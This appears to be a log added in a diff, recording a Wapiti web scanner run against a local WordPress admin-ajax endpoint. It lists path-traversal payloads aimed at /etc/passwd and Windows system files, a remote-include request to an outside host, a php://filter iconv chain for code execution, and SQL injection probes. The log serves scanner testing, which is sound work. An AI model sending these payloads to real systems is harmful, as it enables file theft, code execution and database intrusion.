+	data: filter_tag=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-21 16:47:39.559 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%2Fetc%2Fpasswd
+2024-03-21 16:47:40.205 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%2Fetc%2Fpasswd%00
+2024-03-21 16:47:40.892 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%2Fetc%2Fservices
+2024-03-21 16:47:41.581 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%2Fetc%2Fservices%00
+2024-03-21 16:47:42.268 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-21 16:47:42.950 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-21 16:47:43.609 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-21 16:47:44.294 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 16:47:44.977 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 16:47:45.675 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-21 16:47:46.339 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-21 16:47:46.991 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-21 16:47:47.685 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-21 16:47:48.373 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-21 16:47:49.066 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-21 16:47:49.754 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-21 16:47:50.448 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-21 16:47:51.148 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-21 16:47:51.818 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-21 16:47:52.513 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-21 16:47:53.213 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 16:47:53.907 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 16:47:54.601 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 16:47:55.287 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 16:47:55.959 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-21 16:47:56.608 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-21 16:47:57.302 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-21 16:47:57.965 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-21 16:47:58.646 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-21 16:47:59.296 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-21 16:47:59.949 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-21 16:48:00.608 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-21 16:48:01.303 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-21 16:48:01.963 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 16:48:02.689 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 16:48:03.369 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 16:48:04.052 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 16:48:04.713 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-21 16:48:05.407 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-21 16:48:06.058 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-21 16:48:06.751 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-21 16:48:07.443 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-21 16:48:08.136 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-21 16:48:08.779 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-21 16:48:09.428 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-21 16:48:10.122 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 16:48:10.812 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 16:48:11.496 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 16:48:12.195 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 16:48:12.880 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-21 16:48:13.572 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-21 16:48:14.266 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-21 16:48:14.962 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-21 16:48:15.646 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-21 16:48:16.332 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-21 16:48:17.015 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 16:48:17.694 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 16:48:18.342 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=admin-ajax.php
+2024-03-21 16:48:19.071 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=admin-ajax.php%00
+2024-03-21 16:48:19.757 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=admin-ajax.php%3A%3A%24DATA
+2024-03-21 16:48:20.433 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-21 16:48:20.463 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-21 16:48:20.468 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-21 16:48:20.480 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox
+2024-03-21 16:48:20.480 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%C2%BF%27%22%28&action=GalleryBox
+2024-03-21 16:48:21.170 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=fuzz%C2%BF%27%22%28
+2024-03-21 16:48:22.524 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%20AND%2084%3D96%20AND%2093%3D93&action=GalleryBox
+2024-03-21 16:48:23.185 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%27%20AND%2073%3D159%20AND%20%2746%27%3D%2746&action=GalleryBox
+2024-03-21 16:48:23.846 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%22%20AND%2054%3D152%20AND%20%2227%22%3D%2227&action=GalleryBox
+2024-03-21 16:48:24.513 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%29%20AND%2031%3D86%20AND%20%2884%3D84&action=GalleryBox
+2024-03-21 16:48:25.176 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%27%29%20AND%2080%3D93%20AND%20%28%2775%27%3D%2775&action=GalleryBox
+2024-03-21 16:48:25.836 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%22%29%20AND%2020%3D76%20AND%20%28%2268%22%3D%2268&action=GalleryBox
+2024-03-21 16:48:26.497 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%20AND%2031%3D86%20AND%2029%3D29
+2024-03-21 16:48:27.145 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%20AND%2075%3D85%20AND%2094%3D94
+2024-03-21 16:48:27.835 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%20AND%2051%3D51%20AND%2013%3D13
+2024-03-21 16:48:28.528 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%27%20AND%2083%3D99%20AND%20%2738%27%3D%2738
+2024-03-21 16:48:29.209 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%27%20AND%2073%3D120%20AND%20%2732%27%3D%2732
